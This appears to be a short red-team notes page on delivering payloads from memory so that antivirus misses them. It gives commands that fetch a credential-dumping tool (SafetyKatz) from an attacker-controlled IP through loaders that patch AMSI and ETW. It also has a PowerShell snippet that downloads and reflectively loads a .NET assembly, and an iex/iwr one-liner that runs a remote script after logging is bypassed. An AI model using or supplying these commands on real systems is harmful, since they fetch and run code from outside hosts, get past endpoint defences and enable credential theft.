# Payload Delivery

## Theory

Antivirus software detects and flags malicious content stored on the disk. However, if you execute payloads directly from memory instead of saving them locally, you can bypass detection and avoid potential issues. In essence, by treating the disk as if it were lava, you can circumvent the security measures in place.

{% hint style="danger" %}
THE DISK IS LAVA
{% endhint %}

## Abuse

### .Net payload

Can be done in two ways:&#x20;

#### With Net Loader&#x20;

[Loader.exe](https://github.com/Flangvik/NetLoader) can be used to load binary from filepath or URL and patch AMSI & ETW while executing.

```
.\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```

But this loader will still be flagged by the AV so is needed to use it in combo with AssemblyLoad.exe, that can be used to load the NetLoader in memory from a URL which then loads a binary from a filepath or URL.

```
.\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```

#### Don't know but it works

//TODO

Tested with WinPeas&#x20;

{% code overflow="wrap" %}
```powershell
$data=(New-Object System.Net.WebClient).DownloadData('<URL>');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[<Program>.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
```
{% endcode %}

### Powershell Script

Necessary to bypass amsi end logging first

```
iex (iwr <$Url> -UseBasicParsing)
```
